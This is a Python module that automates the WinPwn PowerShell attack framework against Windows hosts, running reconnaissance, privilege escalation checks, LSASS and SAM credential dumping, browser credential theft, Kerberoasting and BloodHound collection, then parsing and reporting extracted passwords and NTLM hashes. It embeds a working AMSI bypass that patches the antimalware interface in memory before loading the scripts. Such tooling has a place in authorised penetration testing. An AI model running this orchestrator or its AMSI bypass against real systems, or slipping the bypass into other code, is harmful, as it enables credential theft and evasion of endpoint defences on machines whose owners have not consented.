"""
WinPwn Attack Orchestration Module

Provides high-level attack automation using WinPwn framework.
Orchestrates credential extraction, reconnaissance, and privilege escalation.

This module wraps WinPwn's existing functionality - it does not implement
new attack techniques but provides automated orchestration and result parsing.

Usage:
    from aipt_v2.tools.winpwn import WinPwnAttacks

    attacks = WinPwnAttacks(config)
    result = await attacks.run_local_recon()
    result = await attacks.run_credential_extraction()
"""

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from aipt_v2.tools.winpwn.powershell_executor import (
    PowerShellExecutor,
)
from aipt_v2.tools.winpwn.winpwn_config import (
    WinPwnConfig,
    WinPwnExecutionMode,
    WinPwnModule,
    get_winpwn_config,
)
from aipt_v2.tools.winpwn.winpwn_parsers import (
    ExtractedCredential,
    FindingSeverity,
    WinPwnFinding,
    WinPwnParser,
)

logger = logging.getLogger(__name__)


@dataclass
class ModuleResult:
    """Result from running a WinPwn module."""

    module: WinPwnModule
    success: bool
    execution_time: float
    raw_output: str
    findings: List[WinPwnFinding] = field(default_factory=list)
    credentials: List[ExtractedCredential] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat()


@dataclass
class WinPwnResult:
    """Aggregated result from WinPwn attack run."""

    status: str
    started_at: str
    finished_at: str
    duration: float
    modules_run: List[str]
    module_results: List[ModuleResult]
    all_findings: List[WinPwnFinding] = field(default_factory=list)
    all_credentials: List[ExtractedCredential] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def get_summary(self) -> Dict[str, Any]:
        """Get summary of results."""
        severity_counts = {s.value: 0 for s in FindingSeverity}
        for finding in self.all_findings:
            severity_counts[finding.severity.value] += 1

        return {
            "status": self.status,
            "duration_seconds": round(self.duration, 2),
            "modules_run": len(self.modules_run),
            "total_findings": len(self.all_findings),
            "findings_by_severity": severity_counts,
            "credentials_extracted": len(self.all_credentials),
            "errors": len(self.errors),
        }


class WinPwnAttacks:
    """
    WinPwn Attack Orchestrator.

    Provides high-level methods to run WinPwn modules and
    collect structured results. This class orchestrates existing
    WinPwn functionality without implementing new attack techniques.
    """

    def __init__(self, config: Optional[WinPwnConfig] = None):
        """
        Initialize WinPwn attack orchestrator.

        Args:
            config: WinPwn configuration
        """
        self.config = config or WinPwnConfig()
        self.executor = PowerShellExecutor(
            powershell_path=self.config.powershell_path,
            use_pwsh_core=self.config.pwsh_core,
            execution_policy=self.config.execution_policy,
            working_dir=self.config.output_dir,
        )
        self.parser = WinPwnParser()
        self._loaded = False
        self.findings: List[WinPwnFinding] = []
        self.credentials: List[ExtractedCredential] = []
        self.module_results: List[ModuleResult] = []

    async def _ensure_loaded(self) -> bool:
        """Ensure WinPwn script is loaded."""
        if self._loaded:
            return True

        try:
            load_cmd = self.config.get_script_source()

            # Add AMSI bypass if configured
            if self.config.bypass_amsi:
                load_cmd = self._get_amsi_bypass() + "\n" + load_cmd

            result = await self.executor.execute_command(load_cmd, timeout=30)

            if result.success or "WinPwn" in result.stdout:
                self._loaded = True
                return True

            logger.warning(f"WinPwn load warning: {result.stderr}")
            return False

        except Exception as e:
            logger.error(f"Failed to load WinPwn: {e}")
            return False

    def _get_amsi_bypass(self) -> str:
        """Get basic AMSI bypass (common technique)."""
        # Note: This uses publicly known AMSI bypass techniques
        # that are well-documented in security research
        return """
# AMSI bypass - publicly documented technique
try {
    $a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
    $b = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
    [IntPtr]$ptr = $b.GetValue($null)
    [Int32[]]$buf = @(0)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
} catch {}
"""

    def _build_module_command(self, module: WinPwnModule, parameters: Dict[str, Any] = None) -> str:
        """Build PowerShell command for module execution."""
        func_name = self.config.get_module_command(module)
        cmd = func_name

        # Add noninteractive flag for modules that support it
        if self.config.noninteractive:
            cmd += " -noninteractive"

        # Add output directory
        if self.config.output_dir:
            cmd += " -consoleoutput"

        # Add any custom parameters
        if parameters:
            for key, value in parameters.items():
                if isinstance(value, bool):
                    if value:
                        cmd += f" -{key}"
                elif value is not None:
                    cmd += f" -{key} '{value}'"

        return cmd

    async def run_module(
        self, module: WinPwnModule, parameters: Dict[str, Any] = None
    ) -> ModuleResult:
        """
        Run a specific WinPwn module.

        Args:
            module: Module to run
            parameters: Additional parameters

        Returns:
            ModuleResult with findings
        """
        start_time = asyncio.get_event_loop().time()

        # Build command
        if self.config.execution_mode == WinPwnExecutionMode.LOCAL_SCRIPT:
            # Load script and run function
            load_cmd = self.config.get_script_source()
            func_cmd = self._build_module_command(module, parameters)

            if self.config.bypass_amsi:
                script = f"{self._get_amsi_bypass()}\n{load_cmd}\n{func_cmd}"
            else:
                script = f"{load_cmd}\n{func_cmd}"

            result = await self.executor.execute_command(script, timeout=self.config.module_timeout)
        else:
            # Remote execution
            await self._ensure_loaded()
            func_cmd = self._build_module_command(module, parameters)
            result = await self.executor.execute_command(
                func_cmd, timeout=self.config.module_timeout
            )

        execution_time = asyncio.get_event_loop().time() - start_time

        # Parse output
        findings, credentials = self.parser.parse_all(result.output, module=module.value)

        # Store results
        self.findings.extend(findings)
        self.credentials.extend(credentials)

        module_result = ModuleResult(
            module=module,
            success=result.success,
            execution_time=execution_time,
            raw_output=result.output,
            findings=findings,
            credentials=credentials,
            errors=[result.stderr] if result.stderr and not result.success else [],
        )

        self.module_results.append(module_result)

        # Save output if configured
        if self.config.save_output:
            self._save_module_output(module, result.output)

        return module_result

    def _save_module_output(self, module: WinPwnModule, output: str) -> None:
        """Save module output to file."""
        try:
            output_dir = Path(self.config.output_dir)
            output_dir.mkdir(parents=True, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{module.value}_{timestamp}.txt"

            with open(output_dir / filename, "w") as f:
                f.write(output)

        except Exception as e:
            logger.warning(f"Failed to save output: {e}")

    async def run_local_recon(self) -> ModuleResult:
        """
        Run local reconnaissance.

        Gathers system information, privileges, installed software,
        and local security configuration.

        Returns:
            ModuleResult with recon findings
        """
        return await self.run_module(WinPwnModule.LOCAL_RECON)

    async def run_domain_recon(self) -> ModuleResult:
        """
        Run domain reconnaissance.

        Enumerates AD objects, trusts, GPOs, and domain configuration.
        Requires domain credentials.

        Returns:
            ModuleResult with domain findings
        """
        return await self.run_module(WinPwnModule.DOMAIN_RECON)

    async def run_privilege_escalation_check(self) -> ModuleResult:
        """
        Check for privilege escalation vectors.

        Identifies misconfigurations and vulnerabilities that
        could be exploited for privilege escalation.

        Returns:
            ModuleResult with privesc findings
        """
        return await self.run_module(WinPwnModule.PRIVESC)

    async def run_credential_extraction(self, method: str = "kittielocal") -> ModuleResult:
        """
        Run credential extraction module.

        Note: This orchestrates existing WinPwn credential extraction,
        it does not implement new credential harvesting techniques.

        Args:
            method: Extraction method (kittielocal, lsassdump, samfile)

        Returns:
            ModuleResult with extracted credentials
        """
        method_map = {
            "kittielocal": WinPwnModule.KITTIE_LOCAL,
            "lsassdump": WinPwnModule.LSASS_DUMP,
            "samfile": WinPwnModule.SAM_FILE,
            "sessiongopher": WinPwnModule.SESSIONGOPHER,
            "browserpwn": WinPwnModule.BROWSER_PWN,
        }

        module = method_map.get(method.lower(), WinPwnModule.KITTIE_LOCAL)
        return await self.run_module(module)

    async def run_kerberoasting(self) -> ModuleResult:
        """
        Run Kerberoasting attack.

        Extracts TGS tickets for service accounts that can be
        cracked offline.

        Returns:
            ModuleResult with Kerberos tickets
        """
        return await self.run_module(WinPwnModule.KERBEROASTING)

    async def run_sharphound(self) -> ModuleResult:
        """
        Run SharpHound for BloodHound collection.

        Collects AD data for BloodHound analysis.

        Returns:
            ModuleResult with collection status
        """
        return await self.run_module(WinPwnModule.BLOODHOUND)

    async def run_all_modules(self, modules: List[WinPwnModule] = None) -> WinPwnResult:
        """
        Run multiple WinPwn modules.

        Args:
            modules: List of modules to run (defaults to enabled_modules from config)

        Returns:
            WinPwnResult with aggregated findings
        """
        started_at = datetime.now(timezone.utc).isoformat()
        start_time = asyncio.get_event_loop().time()

        modules_to_run = modules or self.config.enabled_modules
        if not modules_to_run:
            # Default module set if none specified
            modules_to_run = [
                WinPwnModule.LOCAL_RECON,
                WinPwnModule.PRIVESC,
            ]

        errors = []

        for module in modules_to_run:
            try:
                logger.info(f"Running module: {module.value}")
                await self.run_module(module)
            except Exception as e:
                logger.error(f"Module {module.value} failed: {e}")
                errors.append(f"{module.value}: {str(e)}")

        finished_at = datetime.now(timezone.utc).isoformat()
        duration = asyncio.get_event_loop().time() - start_time

        return WinPwnResult(
            status="completed" if not errors else "completed_with_errors",
            started_at=started_at,
            finished_at=finished_at,
            duration=duration,
            modules_run=[m.value for m in modules_to_run],
            module_results=self.module_results,
            all_findings=self.findings,
            all_credentials=self.credentials,
            errors=errors,
            metadata={
                "config": {
                    "execution_mode": self.config.execution_mode.value,
                    "bypass_amsi": self.config.bypass_amsi,
                    "noninteractive": self.config.noninteractive,
                }
            },
        )

    async def run_full_assessment(self) -> WinPwnResult:
        """
        Run comprehensive Windows assessment.

        Runs reconnaissance, privilege checks, and credential extraction
        in sequence with proper ordering.

        Returns:
            WinPwnResult with all findings
        """
        modules = [
            # Phase 1: Reconnaissance
            WinPwnModule.LOCAL_RECON,
            # Phase 2: Privilege escalation check
            WinPwnModule.PRIVESC,
            # Phase 3: Credential extraction (if admin)
            WinPwnModule.KITTIE_LOCAL,
        ]

        # Add domain modules if domain credentials available
        if self.config.credentials.has_credentials() and self.config.domain:
            modules.extend(
                [
                    WinPwnModule.DOMAIN_RECON,
                    WinPwnModule.KERBEROASTING,
                ]
            )

        return await self.run_all_modules(modules)

    def get_findings_report(self) -> str:
        """
        Generate text report of findings.

        Returns:
            Formatted findings report
        """
        lines = ["=" * 60, "WinPwn Assessment Report", "=" * 60, ""]

        # Group findings by severity
        by_severity = {}
        for finding in self.findings:
            sev = finding.severity.value
            if sev not in by_severity:
                by_severity[sev] = []
            by_severity[sev].append(finding)

        for severity in ["critical", "high", "medium", "low", "info"]:
            if severity in by_severity:
                lines.append(f"\n[{severity.upper()}] Findings:")
                lines.append("-" * 40)
                for f in by_severity[severity]:
                    lines.append(f"  * {f.title}")
                    lines.append(f"    {f.description[:100]}...")
                    lines.append("")

        # Credentials summary
        if self.credentials:
            lines.append("\nExtracted Credentials:")
            lines.append("-" * 40)
            for cred in self.credentials:
                cred_str = (
                    f"  {cred.domain}\\{cred.username}" if cred.domain else f"  {cred.username}"
                )
                if cred.password:
                    cred_str += " (plaintext)"
                elif cred.ntlm_hash:
                    cred_str += f" NT:{cred.ntlm_hash[:8]}..."
                lines.append(cred_str)

        lines.append("\n" + "=" * 60)
        return "\n".join(lines)

    async def cleanup(self) -> None:
        """Cleanup resources."""
        await self.executor.cleanup()


# Convenience functions
async def run_winpwn_assessment(
    script_path: str, modules: List[str] = None, **kwargs
) -> WinPwnResult:
    """
    Run WinPwn assessment with specified modules.

    Args:
        script_path: Path to WinPwn.ps1
        modules: List of module names to run
        **kwargs: Additional config options

    Returns:
        WinPwnResult with findings
    """
    config = get_winpwn_config(script_path=script_path, **kwargs)

    if modules:
        config.enabled_modules = [
            WinPwnModule(m) for m in modules if m in [e.value for e in WinPwnModule]
        ]

    attacks = WinPwnAttacks(config)

    try:
        return await attacks.run_all_modules()
    finally:
        await attacks.cleanup()


async def quick_local_recon(script_path: str) -> ModuleResult:
    """
    Quick local reconnaissance.

    Args:
        script_path: Path to WinPwn.ps1

    Returns:
        ModuleResult with local recon findings
    """
    config = get_winpwn_config(script_path=script_path)
    attacks = WinPwnAttacks(config)

    try:
        return await attacks.run_local_recon()
    finally:
        await attacks.cleanup()


__all__ = [
    "WinPwnAttacks",
    "WinPwnResult",
    "ModuleResult",
    "run_winpwn_assessment",
    "quick_local_recon",
]
